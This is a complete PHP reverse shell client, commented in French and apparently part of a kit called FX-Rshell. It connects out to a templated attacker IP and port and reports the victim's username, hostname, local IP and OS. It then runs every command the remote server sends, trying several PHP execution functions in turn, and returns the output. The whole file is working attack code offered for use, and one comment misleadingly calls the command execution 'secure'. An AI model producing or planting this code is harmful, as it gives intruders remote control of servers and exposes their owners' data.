<?php
/*
 * PHP Reverse Shell Client pour FX-Rshell
 * 
 * ATTENTION: Pour fonctionner correctement, ce script nécessite:
 * 1. Les permissions d'exécution système (exec, shell_exec, etc.)
 * 2. Un interpréteur PHP récent (5.6+, PHP 7.x ou 8.x recommandés)
 * 3. Exécution avec les droits suffisants sur le système cible
 */

$target = "{{TARGET_IP}}:{{TARGET_PORT}}";
list($ip, $port) = explode(":", $target);

// Métadonnées
$username = get_current_user();
$hostname = gethostname();
$localIP = gethostbyname(trim(`hostname`));
$os = PHP_OS;
$payloadType = "PHP";  // Définir explicitement le type à "PHP"

// Format d'affichage pour la bannière initiale incluant le type
$banner = "[+] PHP Payload Connected:\n" .
         "\t- Username: $username\n" .
         "\t- Hostname: $hostname\n" .
         "\t- LocalIP: $localIP\n" .
         "\t- OS: $os\n" .
         "\t- Type: $payloadType\n\n";

// Connexion
$sock = fsockopen($ip, (int)$port, $errno, $errstr, 10);
if (!$sock) {
    exit(1);
}

// Envoyer la bannière initiale
fwrite($sock, $banner);

/**
 * Exécute une commande de manière sécurisée
 */
function execute_command($command) {
    // Commandes Unix communes avec chemins absolus
    $unix_commands = array(
        'ls' => '/bin/ls',
        'cat' => '/bin/cat',
        'grep' => '/bin/grep',
        'ps' => '/bin/ps',
        'id' => '/usr/bin/id',
        'pwd' => '/bin/pwd',
        'whoami' => '/usr/bin/whoami',
        'uname' => '/bin/uname',
        'ifconfig' => '/sbin/ifconfig',
        'netstat' => '/bin/netstat',
        'find' => '/usr/bin/find',
        'echo' => '/bin/echo'
    );
    
    // Découper pour obtenir la commande principale
    $parts = explode(' ', trim($command), 2);
    $main_cmd = strtolower($parts[0]);
    $args = isset($parts[1]) ? $parts[1] : '';
    
    // Préparer la commande finale
    if (strtoupper(substr(PHP_OS, 0, 3)) === 'WIN') {
        // Sous Windows, on laisse tel quel
        $cmd = $command . ' 2>&1';
    } else {
        // Sous Unix/Linux, on utilise les chemins absolus si disponibles
        if (isset($unix_commands[$main_cmd])) {
            $cmd = $unix_commands[$main_cmd] . ' ' . $args . ' 2>&1';
        } else {
            // Sinon, on utilise la commande telle quelle
            $cmd = $command . ' 2>&1';
        }
    }
    
    // Essayer plusieurs méthodes d'exécution
    $output = null;
    
    // 1. Backticks - la méthode la plus directe
    if ($output === null) {
        try {
            $output = `$cmd`;
        } catch (Exception $e) {
            // Si ça échoue, on continue avec d'autres méthodes
        }
    }
    
    // 2. shell_exec
    if ($output === null && function_exists('shell_exec')) {
        $output = @shell_exec($cmd);
    }
    
    // 3. system avec output buffering
    if ($output === null && function_exists('system')) {
        ob_start();
        @system($cmd);
        $output = ob_get_clean();
    }
    
    // 4. exec avec tableau de sortie
    if ($output === null && function_exists('exec')) {
        $temp = array();
        @exec($cmd, $temp);
        if (!empty($temp)) {
            $output = implode("\n", $temp);
        }
    }
    
    return $output;
}

// Boucle de commande
while (!feof($sock)) {
    // Lire la commande du serveur
    $command = trim(fgets($sock, 1024));
    
    // Si commande vide, continuer
    if (empty($command)) continue;
    
    // Traiter les commandes spéciales
    if ($command === "METADATA") {
        // Le format DOIT être EXACTEMENT comme suit: username|hostname|os|PHP\n
        // Important: Le serveur s'attend à ce format précis
        $metadata_response = "{$username}|{$hostname}|{$os}|PHP\n";
        fwrite($sock, $metadata_response);
        continue;
    }
    
    // Exécuter la commande
    $output = execute_command($command);
    
    // S'assurer qu'il y a toujours une sortie, même vide
    if ($output === null || $output === false || empty($output)) {
        $output = "[no output]\n";
    } else if (substr($output, -1) !== "\n") {
        // Ajouter un saut de ligne si nécessaire
        $output .= "\n";
    }
    
    // Envoyer la sortie au serveur
    fwrite($sock, $output);
}

fclose($sock);
?>

